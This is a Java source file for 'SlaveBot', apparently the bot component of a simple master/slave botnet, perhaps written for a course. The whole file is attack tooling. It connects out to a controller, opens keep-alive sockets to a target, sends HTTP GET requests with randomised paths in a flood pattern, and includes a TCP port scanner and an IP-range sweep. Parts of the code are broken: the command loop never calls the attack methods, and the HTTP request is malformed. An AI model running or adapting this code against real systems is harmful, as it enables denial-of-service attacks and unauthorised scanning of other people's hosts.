
import java.net.*;


import java.net.InetAddress;
import java.util.*;
import java.io.*;
import java.text.SimpleDateFormat;
import java.io.BufferedWriter.*;


public class SlaveBot extends Thread{


	public static ArrayList<Socket> listconnected = new ArrayList<>();
	public static ArrayList<Socket> connected = new ArrayList<>();
	Socket attack;
	public static void main(String [] args) 
	{
		
		if(args.length != 0)
		{
			if(args.length == 4)
			{
				listener b = new listener(Integer.parseInt(args[3]),args[1]);
			}
			else if(args.length == 3)
			{
				listener b = new listener(Integer.parseInt(args[2]),args[1]);
			}
		}
		while(true)
		{
			Scanner inp = new Scanner(System.in);
			String line = inp.nextLine();
		
			String[] dataArray = line.split("\\s+");
			if(dataArray.length == 4)
			{
				String serverName = dataArray[1];
				int port = Integer.parseInt(dataArray[3]);
				listener b = new listener(port,serverName);
			}
			else if(dataArray.length == 3)
			{
				String serverName = dataArray[1];
				int port = Integer.parseInt(dataArray[2]);
				listener b = new listener(port,serverName);
			}

		}
	}
		public static class listener
		{
			private int port;
			private String ip;
			public listener(int port, String ip)
			{
				this.ip = ip;
				this.port = port;
				try {
					
					Socket client = new Socket(ip, port);
					
					listconnected.add(client);
					System.out.println("Connected to " + client.getRemoteSocketAddress());    	
				}catch(IOException e) {
					e.printStackTrace();
					System.out.println("Terminating abnormally with exit code -1");
					System.exit(-1);
				}
			}
		}
		@SuppressWarnings("deprecation")
		public void createSocket(Socket newattack ,int port,String ip, int connections, boolean keepAlive, String url) throws IOException
		{
				
			try {
				
				attack = new Socket();
					
				attack.connect(new InetSocketAddress(ip,port));
				connected.add(attack);
		        if(attack.isConnected()){
		        	System.out.println("\nClient: "+newattack.getRemoteSocketAddress().toString()+" Connected to "+ attack.getInetAddress().toString()+"\nTarget IP: "+attack.getLocalPort()+"\n");
	        	

		        }
		        if(keepAlive)
		        {
		        	attack.setKeepAlive(true);
		        	System.out.println(attack.getKeepAlive());
		        	System.out.println("connectivity will automatically check after 2 hrs");
		        }
		        if(url.length() != 0)
		        {
		        	DataOutputStream os = new DataOutputStream(attack.getOutputStream());
			        DataInputStream is = new DataInputStream(attack.getInputStream());
			        url = url.substring(4, url.length());
			        url = url + getRandString();
			   
			            os.writeBytes("GET "+url +"HTTP/1.1\r\nHost: "+ip);
			        	// oswriteBytes("GET /index.html HTTP/1.1\r\nHost: www.google.com");
			            is.available();
			            os.flush();
			            System.out.println(is.readLine() + "\nrandom string used "+url+"\n");
			         
			            Thread.sleep(1000);
			        	         
		        }
					}catch(IOException e) {
					e.printStackTrace();
					System.out.println("connection probably lost");
					System.out.println("in exception");
					System.out.println("Terminating abnormally with exit code -1");
				
					} catch (InterruptedException e) {
						
						e.printStackTrace();
					}
			
		
		}
		
		
		
		public void disconnect(Socket newattack, String ip, int Port) throws IOException
		{
			try
			{
				for(int i=0; i<connected.size(); i++)
				{
	                                                System.out.println("The connection to "+connected.get(i).getRemoteSocketAddress()+" "+connected.get(i).getLocalPort()+" is closed.");
							connected.get(i).close();
							connected.remove(i);

							break;
					
				}
				
			} catch(IOException e)
			{
				e.printStackTrace();
				System.out.println("Terminating abnormally with exit code -1");
				System.exit(-1);
				}
		}
		
		public void tcpslavescan(Socket newattack, String ip, int sPort, int ePort ) throws IOException
		{
			for(int i=sPort; i<= ePort; i++)
			{
				attack = new Socket();
				try{
					int timeout = 200; 
		         attack.connect(new InetSocketAddress(ip,i),timeout);
		         if(attack.isConnected()){
		        	 System.out.println(i +" ,");
		        	 attack.close();
		         }
		         }catch(Exception e){
		        	 
		        	 continue;
		         }
				
				}
		         
			}
		public void ipscan(Socket newattack, String startIp ,String endIp ) throws IOException
		{
			boolean result;
			 long sInt=ipToDecimal(startIp);
			 long eInt=ipToDecimal(endIp);
			 long diff=eInt-sInt;
			 
			try{
				int m=0;
				int n=0;
				
				
				for(long i=sInt; i<=eInt; i++)
			
			 {
					String address = decimalToIp(i);   
			       
					result=isReachable(address,80,1000);
			      
			        m++;
			        
				if (result) { 
					n++;
		            System.out.printf( address +",  ");
				
				}
				if(m==diff+1){
					if(n==0)
					System.out.println("none of them are replied");
					break;
				}
					
				
			 }
					
				
				
			 }catch(Exception e){
		            System.out.println("Exception: " + e.getMessage());
			 }
			 
			 
		}
		private static boolean isReachable(String addr, int openPort, int timeOutMillis) {
		    // Any Open port on other machine
		    // openPort =  22 - ssh, 80 or 443 - webserver, 25 - mailserver etc.
		    try {
		        try (Socket soc = new Socket()) {
		            soc.connect(new InetSocketAddress(addr, openPort), timeOutMillis);
		        }
		        return true;
		    } catch (IOException ex) {
		        return false;
		    }
		}
		
			 
		public long ipToDecimal(String ipAddress) {

			long result = 0;

			String[] ipAddressInArray = ipAddress.split("\\.");

			for (int i = 3; i >= 0; i--) {

				long ip = Long.parseLong(ipAddressInArray[3 - i]);

				
				result |= ip << (i * 8);

			}

			return result;
			  }
		
		public String decimalToIp(long i) {

			String loIp=((i >> 24) & 0xFF) +
	                   "." + ((i >> 16) & 0xFF) +
	                   "." + ((i >> 8) & 0xFF) +
	                   "." + (i & 0xFF);
			
          return loIp;
		}
		
		public static String getRandString() {
		    String RANDCHARS = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
		    StringBuilder rand = new StringBuilder();
		    Random rnd = new Random();
		    while (rand.length() < 10) {
		        int index = (int) (rnd.nextFloat() * RANDCHARS.length());
		        rand.append(RANDCHARS.charAt(index));
		    }
		    String randStr = rand.toString();
		    return randStr;

		}

}
		
		
		
		
		
		